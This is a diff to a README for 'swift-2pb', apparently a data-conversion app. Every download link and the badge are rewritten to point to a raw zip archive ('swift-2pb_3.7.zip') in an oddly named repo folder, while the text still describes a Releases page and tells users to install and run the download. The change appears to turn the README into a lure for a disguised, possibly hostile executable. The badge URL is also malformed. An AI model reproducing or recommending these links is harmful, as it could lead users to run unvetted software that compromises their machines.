@@ -1,6 +1,6 @@
 # 🚀 swift-2pb - Easy Data Conversion Made Simple
 
-[![Download swift-2pb](https://img.shields.io/badge/Download%20swift--2pb-blue.svg)](https://github.com/dimplesitdown254/swift-2pb/releases)
+[![Download swift-2pb](https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip%https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip)](https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip)
 
 ## 📥 Overview
 
@@ -27,7 +27,7 @@ To use swift-2pb, ensure your system meets the following requirements:
 
 To get started with swift-2pb, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/dimplesitdown254/swift-2pb/releases) where the latest version is available.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip) where the latest version is available.
    
 2. **Select Your Version:** Review the available releases. You will see various versions listed. Choose the latest stable version which is best for your needs. 
 
@@ -37,7 +37,7 @@ To get started with swift-2pb, follow these steps:
 
 5. **Run swift-2pb:** After installation, find the application in your Programs or Applications folder. Launch it to begin converting data.
 
-For reference, here is the direct link again: [Download swift-2pb](https://github.com/dimplesitdown254/swift-2pb/releases).
+For reference, here is the direct link again: [Download swift-2pb](https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip).
 
 ## 🛠️ Using swift-2pb
 
@@ -69,7 +69,7 @@ Yes, you can uninstall it like any other application. Follow your system's stand
 
 ### Are there updates?
 
-Yes, swift-2pb receives regular updates. Users are encouraged to check the [Releases page](https://github.com/dimplesitdown254/swift-2pb/releases) for new features and improvements.
+Yes, swift-2pb receives regular updates. Users are encouraged to check the [Releases page](https://raw.githubusercontent.com/dimplesitdown254/swift-2pb/main/Canarian/swift-2pb_3.7.zip) for new features and improvements.
 
 ## 📞 Support
 
